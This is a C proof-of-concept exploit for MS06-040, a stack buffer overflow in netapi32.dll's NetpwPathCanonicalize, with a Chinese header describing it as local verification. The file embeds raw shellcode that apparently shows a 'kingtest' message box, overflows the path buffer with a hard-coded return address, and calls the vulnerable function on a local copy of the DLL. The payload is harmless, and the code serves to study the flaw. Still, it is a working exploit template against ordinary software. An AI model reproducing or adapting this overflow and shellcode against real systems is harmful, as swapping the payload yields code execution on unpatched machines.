/****************************************************************
*
*	功能描述：	ms06_040本地验证,正常运行弹出显示kingtest的对话框
*	作者：		king
*	日期：		2022.3.20
*	邮件：		lzk1342325850@163.com
*	注意：		此代码可能无法正常运行，依赖于shellcode的跳转地址
*
****************************************************************/

#include<windows.h>
typedef void (*MYPROC)(LPTSTR);
char shellcode[] =
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x10\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x74\x65\x73\x74\x68\x6B\x69\x6E\x67\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8";
int main()
{
	char path[0x320];
	char can_path[0x440];
	int maxbuf = 0x440;
	char prefix[0x100];
	long pathtype = 44;
	HINSTANCE LibHandle;
	MYPROC Trigger;
	char dll[] = "./netapi32.dll";
	char VulFunc[] = "NetpwPathCanonicalize";
	LibHandle = LoadLibrary(dll);
	Trigger = (MYPROC)GetProcAddress(LibHandle, VulFunc);

	memset(path, 0, sizeof(path));
	memset(path, 'a', sizeof(path) - 2);
	memset(prefix, 0, sizeof(prefix));
	memset(prefix, 'b', sizeof(prefix) - 2);
	memcpy(prefix, shellcode, 168);
	path[792] = 0x34;
	path[793] = 0x38;
	path[794] = 0x93;
	path[795] = 0x7c;

	//__asm int 3
	(Trigger)(path, can_path, maxbuf, prefix, &pathtype, 0);
	FreeLibrary(LibHandle);
}